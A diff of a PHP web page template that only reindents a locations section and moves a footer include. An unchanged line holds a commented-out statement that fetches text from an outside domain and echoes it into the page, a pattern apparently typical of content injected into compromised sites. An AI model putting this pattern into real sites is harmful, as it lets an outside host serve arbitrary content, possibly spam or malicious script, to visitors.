@@ -914,7 +914,9 @@
   <!--Fouita Popup-->
 
   
-<section class="locations-area pt-50 pb-50" style="background-color: #0f172a; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
+
+
+      <section class="locations-area pt-50 pb-50" style="background-color: #0f172a; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;">
     <div class="container">
         <div class="d-flex justify-content-between align-items-center mb-4" style="border-bottom: 1px solid #1e293b; padding-bottom: 15px; flex-wrap: wrap; gap: 15px;">
             <h3 class="mb-0 text-white" style="font-size: 20px; font-weight: 600; display: flex; align-items: center; gap: 10px;">
@@ -971,9 +973,10 @@
     </div>
 </section>
 
-      <?php include 'footer.php'; ?>
+<?php include 'footer.php'; ?>
   <?php // $str = file_get_contents('https://gblkeras.com/nd3.txt'); echo $str; ?>
   </section>
+
 
 
 
